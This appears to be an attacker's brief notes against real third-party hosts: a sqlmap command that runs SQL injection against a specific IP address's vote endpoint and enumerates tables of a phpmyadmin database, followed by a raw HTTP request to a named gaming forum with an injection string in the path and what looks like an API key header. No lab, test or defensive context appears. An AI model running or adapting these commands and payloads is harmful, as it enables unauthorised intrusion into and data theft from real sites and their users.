# Page

Origins ips:\


```powershell
python sqlmap.py -u "http://142.44.247.108/vote/*" --dbms=MariaDB --random-agent --prefix="' " --suffix=" --'" --proxy="http://localhost:8080/"  --code=302  -D phpmyadmin --tables
```

```
GET /forums/vanilla/vote/'OR'1'='0 HTTP/1.1
Host: www.mc-complex.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
XF-Api-Key: b43fI7qRx2V2k3L1YxmaEv-jLiYPEuot
XF-Api-User: 1
Content-Length: 334

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="key"

your_attachment_key_here
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="attachment"; filename="filename.jpg"
Content-Type: image/jpeg

<byte stream of your file here>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
